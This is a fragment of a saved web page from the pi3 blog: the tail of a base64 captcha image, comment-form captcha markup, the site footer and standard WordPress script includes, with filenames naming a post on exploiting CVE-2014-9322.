QEAIHwAAKgzAOMrAwBA+AAAED4AAIQPwLVvkQOg3AA4AcIHwAlQYwBuPHsARA/ApVsDAXjXv8yZ53/pToCiAL5+BeAEKNGpj/Ue3QlQFMCpf8JLB6AogHsDAED4AACQcAXQlg5AUQCnbgRcOwBVAdwdAADCBwCAuQfggWcNgJkHYNwdAADCBwCA8AEAoPgVwNgAqArgkQEAIHwAAJi2U2/jbwBUBfDQAAAQPgAAzNnx1AAAED4AANQdgNEBKArgwQEAYMb25wYAgLIDcABQFMCjAwBA+AAAED4AAEw3AO3RAQCg5ADsHYCiAJ4eAADCBwCAuVqfHgAA5vpTPz4AAMw1AOPpAQAgfAAACB8AACYagNGeHwAAwgcAgFoD0A4AigLYXjMAAJQagO9rAeAdBuD72gF47QC8+fPvBHj1AAwAogG8+/NvAtIBOAEAAMAEAOAEAAAAAEwAAE4AAAAAwAQA4AQAAAAATAAATgAAAADABADgBAAAAABMAABOAAAAAMAEAOAEAAAAAEwAAE4AAAAAwAQA4AQAAAAATAAAHx2v69J3BP33d+kAzJoviQIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAkAACAABIAAEgAAQAAJAAAgAASAABIAAEAACQAAIAAEgAASAABAAAkAACAABIAAEgAAQAAJAAAgAASAABIAAAEAACAABIAAEgAAQAAJAAAgAASAABIAAEAACQAAIAAEgAASAABAAAkAACAABIAAEgAAQAAJAAAgAASAABIAAEAACQAAIAAEgAASAABAAAkAACAABIAAEgAAQAAJAAAgAASAABIAAEAACQAAIAAEgAASAABAAAkAACAABIAAEgAAQAAJAAAgAASAABAAAAkAACAABIAAEgAAQAAJAAAgAASAABIAAEAACQAAIAAEgAASAANCs/RBgAObzfTui2ht9AAAAAElFTkSuQmCC" alt="image"></span>
					<span class="cptch_span">&nbsp;=&nbsp;</span>
					<span class="cptch_span">5</span>
					<input type="hidden" name="cptch_result" value="Q3M="><input type="hidden" name="cptch_time" value="1638466888">
					<input type="hidden" name="cptch_form" value="wp_comments">
				</label><span class="cptch_reload_button_wrap hide-if-no-js">
					<noscript>
						<style type="text/css">
							.hide-if-no-js {
								display: none !important;
							}
						</style>
					</noscript>
					<span class="cptch_reload_button dashicons dashicons-update"></span>
				</span></span></p>


</form>

</div>







		

		
	

	</div>

        </div>

<div style="clear:both;"></div>



<div id="footerwrap">



<div id="footer">



     <div id="copyright">



           <p>Copyright © 2021 <a href="http://blog.pi3.com.pl/">pi3 blog</a>.</p>



     </div>



     <div id="design">



           <p><a href="http://www.arsgrafik.com/">Gods &amp; Monsters</a> Theme | Powered by <a href="http://wordpress.org/">WordPress</a> </p>



     </div>







</div>



<script type="text/javascript" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/wp-embed.min.js.下載" id="wp-embed-js"></script>
<script type="text/javascript" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/jquery.min.js.下載" id="jquery-core-js"></script>
<script type="text/javascript" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/jquery-migrate.min.js.下載" id="jquery-migrate-js"></script>
<script type="text/javascript" id="cptch_front_end_script-js-extra">
/* <![CDATA[ */
var cptch_vars = {"nonce":"3488d2cb7b","ajaxurl":"http:\/\/blog.pi3.com.pl\/wp-admin\/admin-ajax.php","enlarge":"0"};
/* ]]> */
</script>
<script type="text/javascript" src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/front_end_script.js.下載" id="cptch_front_end_script-js"></script>
<script src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/e-202148.js.下載" defer=""></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:10.2.1',blog:'21042933',post:'509',tz:'1',srv:'blog.pi3.com.pl'} ]);
	_stq.push([ 'clickTrackerInit', '21042933', '509' ]);
</script>












</div></div><img src="./2015 - Follow-up on Exploiting BadIRET vulnerability (CVE-2014-9322)_files/g.gif" alt="" width="6" height="5" id="wpstats"></body></html>